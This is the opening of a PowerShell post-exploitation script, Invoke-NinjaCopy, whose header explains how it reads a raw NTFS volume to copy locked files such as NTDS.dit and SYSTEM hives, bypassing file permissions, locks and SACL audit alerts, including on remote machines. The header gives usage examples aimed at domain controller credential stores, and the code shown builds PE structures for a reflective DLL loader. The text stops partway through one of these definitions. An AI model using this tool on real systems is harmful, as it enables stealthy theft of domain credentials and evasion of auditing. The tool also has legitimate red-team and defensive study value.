function Invoke-NinjaCopy
{
<#
.SYNOPSIS

This script can copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. This requires you
are an administrator of the server. This allows you to bypass the following protections:
    1. Files which are opened by a process and cannot be opened by other processes, such as the NTDS.dit file or SYSTEM registry hives
    2. SACL flag set on a file to alert when the file is opened (I'm not using a Win32 API to open the file, so Windows has no clue)
    3. Bypass DACL's, such as a DACL which only allows SYSTEM to open a file

If the LocalDestination param is specified, the file will be copied to the file path specified on the local server (the server the script is being run from).
If the RemoteDestination param is specified, the file will be copied to the file path specified on the remote server.

The script works by opening a read handle to the volume (which if logged, may stand out, but I don't think most people log this and other processes do it too).
The script then uses NTFS parsing code written by cyb70289 and posted to CodePlex to parse the NTFS structures. Since the NTFS parsing code is written
in C++, I have compiled the code to a DLL and load it reflective in to PowerShell using the Invoke-ReflectivePEInjection.ps1 script (see below for a link
to the original script).

Script: Invoke-NinjaCopy.ps1
Author: Joe Bialek, Twitter: @JosephBialek
Contributors: This script has a byte array hardcoded, which contains a DLL wich parses NTFS. This NTFS parsing code was written by cyb70289 <cyb70289@gmail.com>
						See the following link: http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib
						The source code is also available with the distribution of this script.
License: GPLv3 or later
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures. This bypasses file DACL's,
read handle locks, and SACL's. You must be an administrator to run the script. This can be used to read SYSTEM files which are normally
locked, such as the NTDS.dit file or registry hives.


.PARAMETER Path

The full path of the file to copy (example: c:\filedir\file.txt)

.PARAMETER LocalDestination

Optional, a file path to copy the file to on the local computer. If this isn't used, RemoteDestination must be specified.

.PARAMETER RemoteDestination

Optional, a file path to copy the file to on the remote computer. If this isn't used, LocalDestination must be specified.

.PARAMETER BufferSize

Optional, how many bytes to read at a time from the file. The default is 5MB.

PowerShell will allocate a Byte[] equal to the size of this buffer, so setting this too high can cause PowerShell to use a LOT of RAM. It's
your job to figure out what "too high" is for your situation.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.


.EXAMPLE

Read the file ntds.dit from a remote server and write it to c:\test\ntds.dit on the local server
$NtdsBytes = Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -ComputerName "Server1" -LocalDestination "c:\test\ntds.dit"

.EXAMPLE

Read the file ntds.dit from a remote server and copy it to the temp directory on the remote server.
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -RemoteDestination "c:\windows\temp\ntds.dit" -ComputerName "Server1"

.EXAMPLE

Read the file ntds.dit from the local server and copy it to the temp directory on the local server.
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\windows\temp\ntds.dit"


.NOTES
This script combines two programs. The first is Invoke-ReflectivePEInjection, links can be found below to the original source.
This is a PowerShell script which can reflectively load EXE's/DLL's.

The second program is NTFS parsing code written in C++ by cyb70289 <cyb70289@gmail.com> and posted to CodeProject. I have compiled this
code as a DLL so it can be reflectively loaded by the PowerShell script. 
The CodeProject code can be found here: http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
NTFS Parsing Code: http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

#>

[CmdletBinding()]
Param(
	[Parameter(Position = 0, Mandatory = $true)]
	[String]
	$Path,

	[Parameter(Position = 1, ParameterSetName="RemoteDest")]
	[String]
	$RemoteDestination,

    [Parameter(Position = 1, ParameterSetName="LocalDest")]
    [String]
    $LocalDestination,
	
	[Parameter(Position = 2)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 3)]
	[UInt32]
	$BufferSize = 5 * 1024 * 1024
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes32,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes64,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[String]
		$Path,
		
		[Parameter(Position = 3)]
		[String]
		$RemoteDestination,
		
		[Parameter(Position = 4)]
		[UInt32]
		$BufferSize,

        [Parameter(Position = 5)]
		[UInt64]
		$FileOffset
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
